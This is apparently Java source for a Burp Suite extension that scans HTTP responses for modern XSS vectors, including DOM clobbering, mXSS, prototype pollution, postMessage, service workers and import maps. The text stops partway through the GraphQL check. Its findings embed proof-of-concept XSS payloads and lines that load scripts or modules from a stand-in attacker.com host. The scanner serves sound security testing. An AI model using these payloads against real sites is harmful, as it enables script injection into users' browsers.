package burp;

import java.util.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

/**
 * Modern XSS Attack Vector Analyzer
 * Implements detection for advanced XSS techniques in modern web applications
 *
 * Covers:
 * - DOM Clobbering
 * - Mutation XSS (mXSS)
 * - Prototype Pollution XSS
 * - PostMessage XSS with Origin Validation
 * - Service Worker Hijacking
 * - Import Maps Manipulation
 * - Trusted Types Bypass
 * - GraphQL XSS
 * - WebSocket XSS
 */
public class ModernXSSAnalyzer {

    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;

    // DOM Clobbering patterns
    private static final Pattern WINDOW_PROPERTY_ACCESS = Pattern.compile(
        "window\\s*\\.\\s*(\\w+)|window\\s*\\[\\s*['\"]?(\\w+)['\"]?\\s*\\]",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern DOCUMENT_PROPERTY_ACCESS = Pattern.compile(
        "document\\s*\\.\\s*(\\w+)|document\\s*\\[\\s*['\"]?(\\w+)['\"]?\\s*\\]",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern UNGUARDED_PROPERTY_ACCESS = Pattern.compile(
        "(?<!var\\s)(?<!let\\s)(?<!const\\s)(?<!function\\s)(?<!\\.)(\\b[a-zA-Z_$][a-zA-Z0-9_$]*\\b)\\s*\\.",
        Pattern.CASE_INSENSITIVE
    );

    // mXSS patterns - parsing context switches
    private static final String[] MXSS_CONTEXT_TAGS = {
        "noscript", "title", "textarea", "style", "script", "xmp",
        "iframe", "noembed", "noframes", "plaintext", "listing"
    };

    // Prototype Pollution patterns
    private static final Pattern PROTO_ACCESS = Pattern.compile(
        "__proto__|constructor\\s*\\.\\s*prototype|Object\\.prototype|prototype\\s*\\[",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern OBJECT_MERGE = Pattern.compile(
        "Object\\.assign|\\.\\.\\.|extend\\(|merge\\(|deepMerge\\(|defaults\\(",
        Pattern.CASE_INSENSITIVE
    );

    // PostMessage patterns with origin check
    private static final Pattern POSTMESSAGE_HANDLER = Pattern.compile(
        "addEventListener\\s*\\(\\s*['\"]message['\"]|onmessage\\s*=",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern ORIGIN_CHECK = Pattern.compile(
        "event\\.origin|e\\.origin|msg\\.origin|message\\.origin",
        Pattern.CASE_INSENSITIVE
    );

    // Service Worker patterns
    private static final Pattern SW_REGISTER = Pattern.compile(
        "navigator\\.serviceWorker\\.register\\s*\\(",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern SW_CACHE = Pattern.compile(
        "caches\\.open|cache\\.put|cache\\.add",
        Pattern.CASE_INSENSITIVE
    );

    // Import Maps patterns
    private static final Pattern IMPORT_MAP = Pattern.compile(
        "<script\\s+type\\s*=\\s*['\"]importmap['\"]",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern DYNAMIC_IMPORT = Pattern.compile(
        "import\\s*\\(\\s*[^'\"`]|import\\s*\\(\\s*`[^`]*\\$\\{",
        Pattern.CASE_INSENSITIVE
    );

    // Trusted Types patterns
    private static final Pattern TRUSTED_TYPES_POLICY = Pattern.compile(
        "trustedTypes\\.createPolicy",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern DEFAULT_POLICY = Pattern.compile(
        "createPolicy\\s*\\(\\s*['\"]default['\"]",
        Pattern.CASE_INSENSITIVE
    );

    // GraphQL patterns
    private static final Pattern GRAPHQL_QUERY = Pattern.compile(
        "query\\s*\\{|mutation\\s*\\{|subscription\\s*\\{|__schema|__type",
        Pattern.CASE_INSENSITIVE
    );

    // WebSocket patterns
    private static final Pattern WEBSOCKET_CREATE = Pattern.compile(
        "new\\s+WebSocket\\s*\\(|io\\s*\\(|socket\\.connect",
        Pattern.CASE_INSENSITIVE
    );

    public ModernXSSAnalyzer(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, Settings settings) {
        this.helpers = helpers;
        this.callbacks = callbacks;
        this.settings = settings;
    }

    /**
     * Main analysis method - runs all modern XSS checks
     */
    public ModernXSSResult analyzeForModernXSS(IHttpRequestResponse requestResponse) {
        ModernXSSResult result = new ModernXSSResult();

        try {
            if (requestResponse == null || requestResponse.getResponse() == null) {
                return result;
            }

            byte[] response = requestResponse.getResponse();
            int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
            String responseBody = new String(
                Arrays.copyOfRange(response, bodyOffset, response.length),
                StandardCharsets.UTF_8
            );

            // Extract JavaScript code from response
            String jsCode = extractJavaScript(responseBody);

            // Run all analyzers
            result.domClobberingVulns = analyzeDOMClobbering(responseBody, jsCode, requestResponse);
            result.mxssVulns = analyzeMutationXSS(responseBody, requestResponse);
            result.protoPollutionVulns = analyzePrototypePollution(responseBody, jsCode, requestResponse);
            result.postMessageVulns = analyzePostMessage(responseBody, jsCode, requestResponse);
            result.serviceWorkerVulns = analyzeServiceWorker(responseBody, jsCode, requestResponse);
            result.importMapVulns = analyzeImportMaps(responseBody, jsCode, requestResponse);
            result.trustedTypesVulns = analyzeTrustedTypes(responseBody, jsCode, requestResponse);
            result.graphqlVulns = analyzeGraphQL(responseBody, requestResponse);
            result.websocketVulns = analyzeWebSocket(responseBody, jsCode, requestResponse);

            // Calculate overall risk
            result.calculateOverallRisk();

        } catch (Exception e) {
            callbacks.printError("[ModernXSSAnalyzer] Error: " + e.getMessage());
        }

        return result;
    }

    // ==================== DOM CLOBBERING ANALYSIS ====================

    /**
     * Analyze for DOM Clobbering vulnerabilities
     * DOM Clobbering exploits named element access via window/document
     */
    private List<VulnerabilityInfo> analyzeDOMClobbering(String responseBody, String jsCode,
                                                          IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Find all property accesses that could be clobbered
            Set<String> vulnerableProperties = new HashSet<>();

            // Check window.propertyName access
            Matcher windowMatcher = WINDOW_PROPERTY_ACCESS.matcher(jsCode);
            while (windowMatcher.find()) {
                String prop = windowMatcher.group(1) != null ? windowMatcher.group(1) : windowMatcher.group(2);
                if (prop != null && !isBuiltinProperty(prop)) {
                    vulnerableProperties.add(prop);
                }
            }

            // Check document.propertyName access
            Matcher docMatcher = DOCUMENT_PROPERTY_ACCESS.matcher(jsCode);
            while (docMatcher.find()) {
                String prop = docMatcher.group(1) != null ? docMatcher.group(1) : docMatcher.group(2);
                if (prop != null && !isBuiltinDocumentProperty(prop)) {
                    vulnerableProperties.add(prop);
                }
            }

            // Check for unguarded direct property access (global variables)
            Matcher ungardedMatcher = UNGUARDED_PROPERTY_ACCESS.matcher(jsCode);
            while (ungardedMatcher.find()) {
                String prop = ungardedMatcher.group(1);
                if (prop != null && !isJavaScriptKeyword(prop) && prop.length() > 2) {
                    // Check if this property is used unsafely (e.g., .innerHTML, .href, etc.)
                    int propEnd = ungardedMatcher.end();
                    String afterProp = jsCode.substring(propEnd, Math.min(propEnd + 50, jsCode.length()));
                    if (isUnsafePropertyUsage(afterProp)) {
                        vulnerableProperties.add(prop);
                    }
                }
            }

            // For each vulnerable property, check if it can be injected
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            List<IParameter> params = reqInfo.getParameters();

            for (String prop : vulnerableProperties) {
                // Check if parameter name matches or if we can inject HTML with name/id
                for (IParameter param : params) {
                    String paramValue = param.getValue();
                    if (paramValue != null && (
                        paramValue.toLowerCase().contains("<form") ||
                        paramValue.toLowerCase().contains("<input") ||
                        paramValue.toLowerCase().contains("<img") ||
                        paramValue.toLowerCase().contains("<a ") ||
                        paramValue.contains("name=") ||
                        paramValue.contains("id="))) {

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "DOM Clobbering";
                        vuln.severity = "High";
                        vuln.confidence = 75.0;
                        vuln.description = "Property '" + prop + "' can be clobbered via HTML injection";
                        vuln.parameter = param.getName();
                        vuln.payload = generateDOMClobberingPayload(prop);
                        vuln.remediation = "Use explicit getElementById/querySelector instead of window property access. " +
                                          "Validate that accessed properties are the expected type.";
                        vulns.add(vuln);
                        break;
                    }
                }
            }

            // Also check for existing form/input elements that could be exploited
            Pattern existingElements = Pattern.compile(
                "<(form|input|img|a|embed|object)\\s+[^>]*(?:name|id)\\s*=\\s*['\"]?(\\w+)['\"]?",
                Pattern.CASE_INSENSITIVE
            );
            Matcher elemMatcher = existingElements.matcher(responseBody);
            while (elemMatcher.find()) {
                String elementName = elemMatcher.group(2);
                if (vulnerableProperties.contains(elementName)) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "DOM Clobbering (Existing Element)";
                    vuln.severity = "Medium";
                    vuln.confidence = 85.0;
                    vuln.description = "Existing element with name/id='" + elementName +
                                      "' may clobber JavaScript property access";
                    vuln.parameter = "N/A (existing element)";
                    vuln.payload = "Element already exists: <" + elemMatcher.group(1) + " name=\"" + elementName + "\">";
                    vuln.remediation = "Rename element or use explicit DOM selection methods.";
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[DOMClobbering] Error: " + e.getMessage());
        }

        return vulns;
    }

    private String generateDOMClobberingPayload(String propertyName) {
        return "<form name=\"" + propertyName + "\"><input name=\"innerHTML\" value=\"<img src=x onerror=alert(1)>\"></form>";
    }

    private boolean isBuiltinProperty(String prop) {
        Set<String> builtins = new HashSet<>(Arrays.asList(
            "location", "document", "history", "navigator", "screen", "localStorage",
            "sessionStorage", "console", "alert", "confirm", "prompt", "setTimeout",
            "setInterval", "clearTimeout", "clearInterval", "fetch", "XMLHttpRequest",
            "Array", "Object", "String", "Number", "Boolean", "Function", "Math", "Date",
            "JSON", "Promise", "Map", "Set", "WeakMap", "WeakSet", "Symbol", "Proxy",
            "Reflect", "Error", "TypeError", "ReferenceError", "SyntaxError", "self",
            "top", "parent", "frames", "opener", "closed", "length", "name", "status"
        ));
        return builtins.contains(prop);
    }

    private boolean isBuiltinDocumentProperty(String prop) {
        Set<String> builtins = new HashSet<>(Arrays.asList(
            "body", "head", "documentElement", "getElementById", "getElementsByClassName",
            "getElementsByTagName", "querySelector", "querySelectorAll", "createElement",
            "createTextNode", "cookie", "domain", "referrer", "title", "URL", "location",
            "readyState", "activeElement", "forms", "images", "links", "scripts", "styleSheets"
        ));
        return builtins.contains(prop);
    }

    private boolean isJavaScriptKeyword(String prop) {
        Set<String> keywords = new HashSet<>(Arrays.asList(
            "var", "let", "const", "function", "class", "if", "else", "for", "while",
            "do", "switch", "case", "break", "continue", "return", "throw", "try",
            "catch", "finally", "new", "delete", "typeof", "instanceof", "in", "of",
            "this", "super", "import", "export", "default", "async", "await", "yield",
            "true", "false", "null", "undefined", "NaN", "Infinity"
        ));
        return keywords.contains(prop);
    }

    private boolean isUnsafePropertyUsage(String afterProp) {
        String[] unsafeProps = {"innerHTML", "outerHTML", "href", "src", "action", "data",
                               "value", "textContent", "innerText", "setAttribute"};
        String lower = afterProp.toLowerCase();
        for (String unsafe : unsafeProps) {
            if (lower.contains(unsafe.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    // ==================== MUTATION XSS (mXSS) ANALYSIS ====================

    /**
     * Analyze for Mutation XSS vulnerabilities
     * mXSS exploits HTML parser context switching and re-serialization
     */
    private List<VulnerabilityInfo> analyzeMutationXSS(String responseBody,
                                                        IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Check for innerHTML/insertAdjacentHTML usage (required for mXSS)
            boolean hasInnerHTML = responseBody.toLowerCase().contains("innerhtml") ||
                                   responseBody.toLowerCase().contains("insertadjacenthtml") ||
                                   responseBody.toLowerCase().contains("outerhtml");

            if (!hasInnerHTML) {
                return vulns; // No innerHTML = no mXSS vector
            }

            // Check for mXSS-prone contexts
            for (String tag : MXSS_CONTEXT_TAGS) {
                Pattern tagPattern = Pattern.compile(
                    "<" + tag + "[^>]*>([\\s\\S]*?)</" + tag + ">",
                    Pattern.CASE_INSENSITIVE
                );
                Matcher matcher = tagPattern.matcher(responseBody);

                while (matcher.find()) {
                    String content = matcher.group(1);

                    // Check if user input could reach this context
                    IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                    for (IParameter param : reqInfo.getParameters()) {
                        String paramValue = param.getValue();
                        if (paramValue != null && paramValue.length() > 3) {
                            // Check if param value or similar appears near this tag
                            int tagPos = matcher.start();
                            int contextStart = Math.max(0, tagPos - 200);
                            int contextEnd = Math.min(responseBody.length(), matcher.end() + 200);
                            String context = responseBody.substring(contextStart, contextEnd);

                            if (context.contains(paramValue) || couldReflectHere(param, tag, responseBody)) {
                                VulnerabilityInfo vuln = new VulnerabilityInfo();
                                vuln.type = "Mutation XSS (mXSS)";
                                vuln.severity = "Critical";
                                vuln.confidence = 70.0;
                                vuln.description = "Potential mXSS via <" + tag + "> context. " +
                                    "Content inside <" + tag + "> may be re-parsed when extracted.";
                                vuln.parameter = param.getName();
                                vuln.payload = generateMXSSPayload(tag);
                                vuln.remediation = "Avoid innerHTML with user content. Use textContent or " +
                                    "a trusted sanitizer like DOMPurify with mutation XSS protections.";
                                vulns.add(vuln);
                                break;
                            }
                        }
                    }
                }
            }

            // Check for SVG/MathML context switching (common mXSS vector)
            if (responseBody.toLowerCase().contains("<svg") ||
                responseBody.toLowerCase().contains("<math")) {
                VulnerabilityInfo vuln = new VulnerabilityInfo();
                vuln.type = "Mutation XSS (SVG/MathML Context)";
                vuln.severity = "High";
                vuln.confidence = 65.0;
                vuln.description = "SVG/MathML elements detected. These can cause parser context " +
                    "switching leading to mXSS when combined with innerHTML.";
                vuln.parameter = "Multiple";
                vuln.payload = "<svg><foreignObject><![CDATA[<img src=x onerror=alert(1)>]]></foreignObject></svg>";
                vuln.remediation = "Sanitize SVG/MathML content carefully. Consider using CSP to restrict inline scripts.";
                vulns.add(vuln);
            }

        } catch (Exception e) {
            callbacks.printError("[mXSS] Error: " + e.getMessage());
        }

        return vulns;
    }

    private String generateMXSSPayload(String contextTag) {
        switch (contextTag.toLowerCase()) {
            case "noscript":
                return "<noscript><img src=x onerror=alert(1)></noscript>";
            case "title":
                return "</title><img src=x onerror=alert(1)>";
            case "textarea":
                return "</textarea><img src=x onerror=alert(1)>";
            case "style":
                return "</style><img src=x onerror=alert(1)>";
            case "script":
                return "</script><img src=x onerror=alert(1)>";
            case "iframe":
                return "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">";
            case "xmp":
            case "plaintext":
            case "listing":
                return "</" + contextTag + "><img src=x onerror=alert(1)>";
            default:
                return "<img src=x onerror=alert(1)>";
        }
    }

    private boolean couldReflectHere(IParameter param, String tag, String response) {
        // Heuristic: check if parameter name suggests it could reach this context
        String paramName = param.getName().toLowerCase();
        String[] contentParams = {"content", "text", "body", "html", "message", "data",
                                  "value", "input", "query", "search", "comment"};
        for (String cp : contentParams) {
            if (paramName.contains(cp)) {
                return true;
            }
        }
        return false;
    }

    // ==================== PROTOTYPE POLLUTION XSS ANALYSIS ====================

    /**
     * Analyze for Prototype Pollution leading to XSS
     */
    private List<VulnerabilityInfo> analyzePrototypePollution(String responseBody, String jsCode,
                                                               IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Check for object merge operations
            boolean hasObjectMerge = OBJECT_MERGE.matcher(jsCode).find();

            // Check for __proto__ or constructor.prototype access
            boolean hasProtoAccess = PROTO_ACCESS.matcher(jsCode).find();

            if (!hasObjectMerge && !hasProtoAccess) {
                // Also check for common vulnerable libraries
                boolean hasVulnerableLib = jsCode.contains("lodash") ||
                                          jsCode.contains("jquery.extend") ||
                                          jsCode.contains("$.extend") ||
                                          jsCode.contains("underscore");
                if (!hasVulnerableLib) {
                    return vulns;
                }
            }

            // Check for sinks that could execute if prototype is polluted
            String[] ppSinks = {"innerHTML", "outerHTML", "srcdoc", "href", "src",
                               "onclick", "onerror", "onload", "eval", "Function"};

            List<String> detectedSinks = new ArrayList<>();
            for (String sink : ppSinks) {
                if (jsCode.toLowerCase().contains(sink.toLowerCase())) {
                    detectedSinks.add(sink);
                }
            }

            if (!detectedSinks.isEmpty()) {
                // Check request parameters for PP payloads
                IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                for (IParameter param : reqInfo.getParameters()) {
                    String paramValue = param.getValue();
                    if (paramValue != null &&
                        (paramValue.contains("__proto__") ||
                         paramValue.contains("constructor") ||
                         paramValue.contains("prototype"))) {

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Prototype Pollution XSS";
                        vuln.severity = "Critical";
                        vuln.confidence = 80.0;
                        vuln.description = "Prototype pollution vector detected. Polluted properties " +
                            "could reach sinks: " + String.join(", ", detectedSinks);
                        vuln.parameter = param.getName();
                        vuln.payload = generatePrototypePollutionPayload(detectedSinks.get(0));
                        vuln.remediation = "Use Object.create(null) for lookup objects. " +
                            "Validate and sanitize object keys. Use Map instead of plain objects.";
                        vulns.add(vuln);
                    }
                }

                // Even without explicit PP payload, flag if merge + sinks exist
                if (hasObjectMerge && vulns.isEmpty()) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "Prototype Pollution XSS (Potential)";
                    vuln.severity = "Medium";
                    vuln.confidence = 55.0;
                    vuln.description = "Object merge operations detected with sinks: " +
                        String.join(", ", detectedSinks) + ". Test for prototype pollution.";
                    vuln.parameter = "JSON body or query parameters";
                    vuln.payload = "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}";
                    vuln.remediation = "Sanitize object keys before merge operations.";
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[PrototypePollution] Error: " + e.getMessage());
        }

        return vulns;
    }

    private String generatePrototypePollutionPayload(String targetSink) {
        switch (targetSink.toLowerCase()) {
            case "innerhtml":
            case "outerhtml":
                return "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}";
            case "href":
            case "src":
                return "{\"__proto__\":{\"" + targetSink + "\":\"javascript:alert(1)\"}}";
            case "onclick":
            case "onerror":
            case "onload":
                return "{\"__proto__\":{\"" + targetSink + "\":\"alert(1)\"}}";
            default:
                return "{\"__proto__\":{\"polluted\":\"<img src=x onerror=alert(1)>\"}}";
        }
    }

    // ==================== POSTMESSAGE XSS ANALYSIS ====================

    /**
     * Analyze for PostMessage XSS with Origin Validation bypass
     */
    private List<VulnerabilityInfo> analyzePostMessage(String responseBody, String jsCode,
                                                        IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Find postMessage handlers
            Matcher handlerMatcher = POSTMESSAGE_HANDLER.matcher(jsCode);

            while (handlerMatcher.find()) {
                int handlerPos = handlerMatcher.start();

                // Extract handler function body (approximate)
                int funcStart = jsCode.indexOf("{", handlerPos);
                if (funcStart < 0 || funcStart > handlerPos + 200) continue;

                int funcEnd = findMatchingBrace(jsCode, funcStart);
                if (funcEnd < 0) continue;

                String handlerBody = jsCode.substring(funcStart, Math.min(funcEnd + 1, jsCode.length()));

                // Check for origin validation
                boolean hasOriginCheck = ORIGIN_CHECK.matcher(handlerBody).find();

                // Check for unsafe operations in handler
                boolean hasUnsafeSink = handlerBody.toLowerCase().contains("innerhtml") ||
                                       handlerBody.toLowerCase().contains("eval") ||
                                       handlerBody.toLowerCase().contains("function(") ||
                                       handlerBody.toLowerCase().contains("document.write") ||
                                       handlerBody.toLowerCase().contains("srcdoc");

                // Check for wildcard origin in postMessage send
                boolean hasWildcardSend = jsCode.contains("postMessage(") &&
                                         jsCode.contains("'*'");

                if (!hasOriginCheck && hasUnsafeSink) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "PostMessage XSS (No Origin Validation)";
                    vuln.severity = "High";
                    vuln.confidence = 85.0;
                    vuln.description = "PostMessage handler without origin validation processes " +
                        "messages unsafely. Attacker can send malicious messages from any origin.";
                    vuln.parameter = "postMessage event.data";
                    vuln.payload = generatePostMessageExploit();
                    vuln.remediation = "Always validate event.origin against a whitelist. " +
                        "Never use innerHTML with message data. Validate message structure.";
                    vulns.add(vuln);
                } else if (hasOriginCheck && hasUnsafeSink) {
                    // Origin check exists but could be bypassable
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "PostMessage XSS (Review Origin Check)";
                    vuln.severity = "Medium";
                    vuln.confidence = 60.0;
                    vuln.description = "PostMessage handler has origin check but uses unsafe sinks. " +
                        "Review if origin validation is strict (not contains/startsWith/endsWith).";
                    vuln.parameter = "postMessage event.data";
                    vuln.payload = "Test with: window.postMessage({html:'<img src=x onerror=alert(1)>'},'*')";
                    vuln.remediation = "Use strict origin comparison: event.origin === 'https://trusted.com'";
                    vulns.add(vuln);
                }

                if (hasWildcardSend) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "PostMessage Wildcard Origin";
                    vuln.severity = "Medium";
                    vuln.confidence = 90.0;
                    vuln.description = "postMessage uses wildcard '*' origin, allowing any receiver. " +
                        "Sensitive data could be leaked to attacker-controlled windows.";
                    vuln.parameter = "postMessage targetOrigin";
                    vuln.payload = "window.postMessage(sensitiveData, '*')";
                    vuln.remediation = "Specify exact target origin instead of wildcard.";
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[PostMessage] Error: " + e.getMessage());
        }

        return vulns;
    }

    private String generatePostMessageExploit() {
        return "<!-- Attacker's page -->\n" +
               "<iframe id=\"target\" src=\"https://vulnerable.com\"></iframe>\n" +
               "<script>\n" +
               "  target.contentWindow.postMessage(\n" +
               "    {html: '<img src=x onerror=alert(document.domain)>'},\n" +
               "    '*'\n" +
               "  );\n" +
               "</script>";
    }

    private int findMatchingBrace(String code, int openBracePos) {
        int depth = 1;
        for (int i = openBracePos + 1; i < code.length() && i < openBracePos + 5000; i++) {
            char c = code.charAt(i);
            if (c == '{') depth++;
            else if (c == '}') depth--;
            if (depth == 0) return i;
        }
        return -1;
    }

    // ==================== SERVICE WORKER ANALYSIS ====================

    /**
     * Analyze for Service Worker security issues
     */
    private List<VulnerabilityInfo> analyzeServiceWorker(String responseBody, String jsCode,
                                                          IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Check for SW registration
            Matcher swMatcher = SW_REGISTER.matcher(jsCode);

            if (swMatcher.find()) {
                // Extract SW URL
                int regStart = swMatcher.end();
                int urlEnd = jsCode.indexOf(")", regStart);
                if (urlEnd > regStart) {
                    String swParams = jsCode.substring(regStart, urlEnd);

                    // Check for overly broad scope
                    if (swParams.contains("scope") && swParams.contains("'/'")) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Service Worker Broad Scope";
                        vuln.severity = "Medium";
                        vuln.confidence = 80.0;
                        vuln.description = "Service Worker registered with root scope '/'. " +
                            "If SW can be controlled, attacker can intercept all site traffic.";
                        vuln.parameter = "Service Worker scope";
                        vuln.payload = "N/A - check if SW script is injectable";
                        vuln.remediation = "Limit SW scope to specific paths that need offline support.";
                        vulns.add(vuln);
                    }

                    // Check if SW URL could be injectable
                    IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                    for (IParameter param : reqInfo.getParameters()) {
                        String paramValue = param.getValue();
                        if (paramValue != null &&
                            (swParams.contains(paramValue) ||
                             paramValue.endsWith(".js") ||
                             paramValue.contains("sw") ||
                             paramValue.contains("worker"))) {

                            VulnerabilityInfo vuln = new VulnerabilityInfo();
                            vuln.type = "Service Worker Path Injection";
                            vuln.severity = "Critical";
                            vuln.confidence = 70.0;
                            vuln.description = "Service Worker registration URL may be injectable. " +
                                "Parameter '" + param.getName() + "' could control SW location.";
                            vuln.parameter = param.getName();
                            vuln.payload = "?sw_path=//attacker.com/malicious-sw.js";
                            vuln.remediation = "Hardcode Service Worker paths. Never use user input in SW registration.";
                            vulns.add(vuln);
                            break;
                        }
                    }
                }

                // Check for cache poisoning potential
                if (SW_CACHE.matcher(jsCode).find()) {
                    VulnerabilityInfo vuln = new VulnerabilityInfo();
                    vuln.type = "Service Worker Cache Poisoning (Potential)";
                    vuln.severity = "Medium";
                    vuln.confidence = 50.0;
                    vuln.description = "Service Worker caches responses. If cacheable responses " +
                        "contain user input, XSS could persist across page reloads.";
                    vuln.parameter = "Cached response content";
                    vuln.payload = "Inject XSS payload, then trigger cache update";
                    vuln.remediation = "Don't cache responses containing user input. Use vary headers appropriately.";
                    vulns.add(vuln);
                }
            }

        } catch (Exception e) {
            callbacks.printError("[ServiceWorker] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== IMPORT MAPS ANALYSIS ====================

    /**
     * Analyze for Import Maps manipulation
     */
    private List<VulnerabilityInfo> analyzeImportMaps(String responseBody, String jsCode,
                                                       IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Check for import map presence
            if (IMPORT_MAP.matcher(responseBody).find()) {
                // Check if import map content could be injectable
                IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                for (IParameter param : reqInfo.getParameters()) {
                    String paramValue = param.getValue();
                    if (paramValue != null &&
                        (paramValue.contains("importmap") ||
                         paramValue.contains("imports") ||
                         paramValue.contains("\"") && paramValue.contains(":"))) {

                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Import Map Injection";
                        vuln.severity = "Critical";
                        vuln.confidence = 75.0;
                        vuln.description = "Import map content may be injectable. " +
                            "Attacker could redirect module imports to malicious URLs.";
                        vuln.parameter = param.getName();
                        vuln.payload = "{\"imports\":{\"react\":\"https://attacker.com/fake-react.js\"}}";
                        vuln.remediation = "Never include user input in import maps. Use CSP to restrict script sources.";
                        vulns.add(vuln);
                        break;
                    }
                }
            }

            // Check for dynamic imports with user-controlled URL
            Matcher dynamicImportMatcher = DYNAMIC_IMPORT.matcher(jsCode);
            if (dynamicImportMatcher.find()) {
                VulnerabilityInfo vuln = new VulnerabilityInfo();
                vuln.type = "Dynamic Import URL Injection";
                vuln.severity = "High";
                vuln.confidence = 65.0;
                vuln.description = "Dynamic import() with variable URL detected. " +
                    "If URL is user-controlled, attacker can load arbitrary modules.";
                vuln.parameter = "Module URL parameter";
                vuln.payload = "import('https://attacker.com/malicious-module.js')";
                vuln.remediation = "Whitelist allowed module URLs. Use static imports when possible.";
                vulns.add(vuln);
            }

        } catch (Exception e) {
            callbacks.printError("[ImportMaps] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== TRUSTED TYPES ANALYSIS ====================

    /**
     * Analyze for Trusted Types bypass opportunities
     */
    private List<VulnerabilityInfo> analyzeTrustedTypes(String responseBody, String jsCode,
                                                         IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Check for Trusted Types policy creation
            Matcher policyMatcher = TRUSTED_TYPES_POLICY.matcher(jsCode);

            if (policyMatcher.find()) {
                // Check for default policy (often weak)
                if (DEFAULT_POLICY.matcher(jsCode).find()) {
                    // Extract policy handler
                    int policyStart = jsCode.indexOf("createPolicy", policyMatcher.start());
                    int handlerStart = jsCode.indexOf("{", policyStart);
                    if (handlerStart > 0) {
                        int handlerEnd = findMatchingBrace(jsCode, handlerStart);
                        if (handlerEnd > handlerStart) {
                            String handler = jsCode.substring(handlerStart, handlerEnd + 1);

                            // Check for identity function (s => s, function(s){return s})
                            boolean isIdentity = handler.matches(".*=>\\s*\\w+[,}].*") ||
                                                handler.contains("return s") ||
                                                handler.contains("return input") ||
                                                handler.contains("return value");

                            if (isIdentity) {
                                VulnerabilityInfo vuln = new VulnerabilityInfo();
                                vuln.type = "Trusted Types Default Policy Bypass";
                                vuln.severity = "High";
                                vuln.confidence = 85.0;
                                vuln.description = "Default Trusted Types policy returns input unchanged. " +
                                    "This effectively disables Trusted Types protection.";
                                vuln.parameter = "Any innerHTML sink";
                                vuln.payload = "element.innerHTML = '<img src=x onerror=alert(1)>'";
                                vuln.remediation = "Implement proper sanitization in policy handlers. " +
                                    "Use DOMPurify.sanitize() in createHTML handler.";
                                vulns.add(vuln);
                            }
                        }
                    }
                }

                // Check for sinks that might bypass Trusted Types
                String[] bypassablePatterns = {
                    "document.write", "document.writeln",
                    "location.href", "location.assign", "location.replace",
                    "eval(", "new Function("
                };

                for (String pattern : bypassablePatterns) {
                    if (jsCode.contains(pattern) && !jsCode.contains("policy.create")) {
                        VulnerabilityInfo vuln = new VulnerabilityInfo();
                        vuln.type = "Trusted Types Enforcement Gap";
                        vuln.severity = "Medium";
                        vuln.confidence = 60.0;
                        vuln.description = "Sink '" + pattern + "' found without policy wrapper. " +
                            "May bypass Trusted Types if enforcement is partial.";
                        vuln.parameter = "N/A";
                        vuln.payload = "Test: " + pattern + " with XSS payload";
                        vuln.remediation = "Ensure all sinks use Trusted Types. Enable strict CSP.";
                        vulns.add(vuln);
                    }
                }
            }

        } catch (Exception e) {
            callbacks.printError("[TrustedTypes] Error: " + e.getMessage());
        }

        return vulns;
    }

    // ==================== GRAPHQL ANALYSIS ====================

    /**
     * Analyze for GraphQL XSS vulnerabilities
     */
    private List<VulnerabilityInfo> analyzeGraphQL(String responseBody,
                                                    IHttpRequestResponse requestResponse) {
        List<VulnerabilityInfo> vulns = new ArrayList<>();

        try {
            // Check if this is a GraphQL response
            boolean isGraphQL = responseBody.contains("\"data\"") &&
                               (responseBody.contains("\"errors\"") ||
                                responseBody.contains("\"__typename\"") ||
                                GRAPHQL_QUERY.matcher(responseBody).find());

            if (!isGraphQL) {
                // Check request for GraphQL
                byte[] request = requestResponse.getRequest();
                String requestStr = new String(request, StandardCharsets.UTF_8);
                isGraphQL = requestStr.contains("query") &&
                           (requestStr.contains("{") && requestStr.contains("}"));
            }

            if (!isGraphQL) return vulns;

            // Check for introspection enabled
            if (responseBody.contains("__schema") || responseBody.contains("__type")) {
